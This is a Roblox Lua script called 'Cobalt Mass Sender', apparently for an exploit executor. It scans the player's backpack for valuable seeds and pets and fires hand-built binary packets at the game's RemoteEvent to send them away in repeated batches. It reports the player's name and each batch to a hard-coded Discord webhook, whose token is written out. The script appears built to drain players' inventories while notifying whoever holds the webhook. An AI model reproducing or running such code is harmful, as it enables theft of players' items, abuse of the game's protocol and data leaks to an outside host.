-- Cobalt Mass Sender – scans backpack, builds dynamic payload, sends up to 20 per batch
local ALLOWED_PETS = {"Robin"}
local ALLOWED_SEEDS = {"Hypno Bloom","Green Bean","Grape","Coconut","Mushroom","Acorn","Tomato","Dragon's Breath","Star Fruit","Moon Bloom","Briar Rose","Venom Spitter","Apple","Venus Fly Trap","Rocket Pop","Bamboo","Fire Fern","Corn","Pomegranate","Sunflower","Dragon Fruit","Cherry","Sun Bloom","Blueberry","Mango","Cactus","Strawberry","Banana","Poison Apple","Tulip","Pineapple"}
local WEBHOOK = "https://discord.com/api/webhooks/1526222716275785839/65GIm7Yx4pfvQeUc11P8-E8Zc43wtzJiZjn9SVZ_s9CofmAqTe9LWPctE_TMJPkKDRqw"

local Event = game:GetService("ReplicatedStorage").SharedModules.Packet.RemoteEvent
local player = game:GetService("Players").LocalPlayer
local backpack = player:WaitForChild("Backpack")

-- Lookup tables (case‑insensitive)
local petLookup = {}
for _, p in ipairs(ALLOWED_PETS) do petLookup[p:lower()] = true end
local seedLookup = {}
for _, s in ipairs(ALLOWED_SEEDS) do seedLookup[s:lower()] = true end

-- Webhook notifier
local function sendWebhook(msg)
    local req = (type(request) == "function" and request)
        or (type(http_request) == "function" and http_request)
        or (syn and type(syn.request) == "function" and syn.request)
        or (http and type(http.request) == "function" and http.request)
    if req then
        pcall(req, {
            Url = WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode({content = msg})
        })
    end
end

-- Build one item block: \x1C\v\aItemKey\v<len><key>\v\x05Count\x05<count>\v\bCategory\v<len><category>
local function buildItemBlock(key, count, category)
    return "\x1C\v\aItemKey\v" .. string.char(#key) .. key
        .. "\v\x05Count\x05" .. string.char(count)
        .. "\v\bCategory\v" .. string.char(#category) .. category
end

-- Fixed header used in multi‑item examples
local HEADER = "!\x01\x33\x00\x00\xC0\x00X\xB8\xFFA\x1C\x05\x01"

sendWebhook("🚀 **Mass Sender Started** by " .. player.Name)

while true do
    local items = backpack:GetChildren()
    local queue = {}

    -- Scan all items; collect up to 20 matching items
    for _, item in ipairs(items) do
        if #queue >= 20 then break end
        
        local mainCat = item:GetAttribute("MainCategory")
        if mainCat == "Seed" then
            local seedName = item:GetAttribute("SeedTool")
            if seedName and seedLookup[seedName:lower()] then
                local count = item:GetAttribute("Count") or 1
                table.insert(queue, {
                    key = seedName,
                    count = count,
                    category = "Seeds",
                    instance = item
                })
            end
        else  -- assume it's a pet
            local petName = item:GetAttribute("Pet")
            local petId = item:GetAttribute("PetId")
            if petName and petId and petLookup[petName:lower()] then
                table.insert(queue, {
                    key = "$" .. petId,
                    count = 1,      -- pets always count as 1
                    category = "Pets",
                    instance = item
                })
            end
        end
    end

    if #queue == 0 then
        sendWebhook("🏁 **Inventory cleared** – no more matching items.")
        break
    end

    -- Build the full payload
    local payload = HEADER
    for i, itemData in ipairs(queue) do
        if i > 1 then
            payload = payload .. "\x00\x05" .. string.char(i)
        end
        payload = payload .. buildItemBlock(itemData.key, itemData.count, itemData.category)
    end
    payload = payload .. "\x00\x00\x00"

    -- Fire the remote
    if Event then
        Event:FireServer(buffer.fromstring(payload))
    end

    -- Log sent items (no client‑side deletion)
    local logLines = {}
    for _, itemData in ipairs(queue) do
        table.insert(logLines, string.format("• %s (x%d) sent.", itemData.instance.Name, itemData.count))
    end
    sendWebhook("⚡ **Batch fired (" .. #queue .. " items):**\n" .. table.concat(logLines, "\n"))

    -- 12‑second cooldown before next batch
    task.wait(12)
end
